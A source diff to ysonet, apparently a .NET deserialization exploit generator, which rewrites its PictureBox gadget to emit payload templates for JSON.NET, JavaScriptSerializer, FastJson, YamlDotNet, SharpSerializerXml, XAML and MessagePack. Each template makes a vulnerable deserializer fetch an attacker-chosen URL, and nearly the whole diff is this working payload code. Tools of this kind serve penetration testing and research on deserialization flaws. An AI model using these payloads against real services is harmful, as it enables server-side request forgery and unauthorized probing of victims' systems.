@@ -4,6 +4,15 @@ using ysonet.Helpers;
 
 namespace ysonet.Generators
 {
+    /// <summary>
+    /// System.Windows.Forms.PictureBox.ImageLocation loads the supplied URL. Setting
+    /// WaitOnLoad first is what makes the load happen during deserialization, so every
+    /// template below writes WaitOnLoad BEFORE ImageLocation.
+    ///
+    /// Everything this gadget emits lives in this file: the target type names, the
+    /// property order, every formatter template, and the MessagePack surrogate. Nothing
+    /// about PictureBox belongs in a helper or in a shared payload builder.
+    /// </summary>
     public class PictureBoxGenerator : GenericGenerator
     {
         private bool rawInput;
@@ -40,9 +49,9 @@ namespace ysonet.Generators
                 Formatters.FastJson,
                 Formatters.JavaScriptSerializer,
                 "YamlDotNet < 5.0.0",
-                "MessagePackTypeless",
-                "MessagePackTypelessLz4",
-                "SharpSerializerXml",
+                Formatters.MessagePackTypeless,
+                Formatters.MessagePackTypelessLz4,
+                Formatters.SharpSerializerXml,
                 Formatters.Xaml
             };
         }
@@ -54,14 +63,103 @@ namespace ysonet.Generators
 
         public override OptionSet Options()
         {
-            return NonRceGadgetPayloadBuilder.RawInputOption(v => rawInput = v);
+            return RawInputOption(v => rawInput = v);
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            NonRceGadgetPayloadBuilder.RequireInput(inputArgs.Cmd, Name());
-            object payload = NonRceGadgetPayloadBuilder.PictureBox(inputArgs.Cmd, formatter, rawInput);
-            return NonRceGadgetPayloadBuilder.Finish(payload, formatter, inputArgs);
+            RequireCommandInput(inputArgs);
+            return FinishHandWrittenPayload(BuildPayload(inputArgs.Cmd, formatter), formatter, inputArgs);
+        }
+
+        private object BuildPayload(string input, string formatter)
+        {
+            if (IsMessagePackTypeless(formatter))
+            {
+                // Never build a real PictureBox here: assigning ImageLocation while WaitOnLoad
+                // is true IS the effect, so it would fire inside ysonet. Serialize the surrogate
+                // below and let MessagePack write the framework type's name instead.
+                return MessagePackTypelessTypeSwap.SerializeAs(
+                    new PictureBoxSurrogate
+                    {
+                        WaitOnLoad = true,
+                        ImageLocation = input
+                    },
+                    "System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                    IsMessagePackLz4(formatter));
+            }
+
+            if (IsFormatter(formatter, Formatters.JsonNet))
+            {
+                return @"
+{
+    '$type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
+    'WaitOnLoad':'true',
+    'ImageLocation':'" + EscapeForJson(input, rawInput) + @"'
+}";
+            }
+
+            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
+            {
+                return @"
+{
+    '__type':'System.Windows.Forms.PictureBox, System.Windows.Forms, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089',
+    'WaitOnLoad':'true',
+    'ImageLocation':'" + EscapeForJson(input, rawInput) + @"'
+}";
+            }
+
+            if (IsFormatter(formatter, Formatters.FastJson))
+            {
+                return @"
+{
+    ""$types"":{
+        ""System.Windows.Forms.PictureBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"":""1""
+    },
+    ""$type"":""1"",
+    ""WaitOnLoad"":true,
+    ""ImageLocation"":""" + EscapeForJson(input, rawInput) + @"""
+}";
+            }
+
+            if (IsFormatter(formatter, Formatters.YamlDotNet))
+            {
+                return @"
+!<!System.Windows.Forms.PictureBox,System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
+    WaitOnLoad: true,
+    ImageLocation: """ + EscapeForJson(input, rawInput) + @"""
+}";
+            }
+
+            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
+            {
+                return @"
+<Complex type=""System.Windows.Forms.PictureBox,System.Windows.Forms,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"">
+    <Properties>
+        <Simple name=""WaitOnLoad"" type=""System.Boolean,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"" value=""True""/>
+        <Simple name=""ImageLocation"" value=""" + EscapeForXmlAttribute(input, rawInput) + @"""/>
+    </Properties>
+</Complex>";
+            }
+
+            if (IsFormatter(formatter, Formatters.Xaml))
+            {
+                return @"<PictureBox WaitOnLoad=""true"" ImageLocation=""" + EscapeForXmlAttribute(input, rawInput) + @""" xmlns=""clr-namespace:System.Windows.Forms;assembly=System.Windows.Forms"" xmlns:st=""clr-namespace:System.Text;assembly=mscorlib"" xmlns:assembly=""http://schemas.microsoft.com/winfx/2006/xaml"">
+</PictureBox>
+";
+            }
+
+            throw UnsupportedFormatter(formatter);
+        }
+
+        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites the
+        // type name to System.Windows.Forms.PictureBox before the payload leaves ysonet.
+        // Declaration ORDER is significant - MessagePack writes the properties in this order
+        // and PictureBox loads only when WaitOnLoad is already true.
+        internal sealed class PictureBoxSurrogate
+        {
+            public bool WaitOnLoad { get; set; }
+            public string ImageLocation { get; set; }
         }
     }
 }
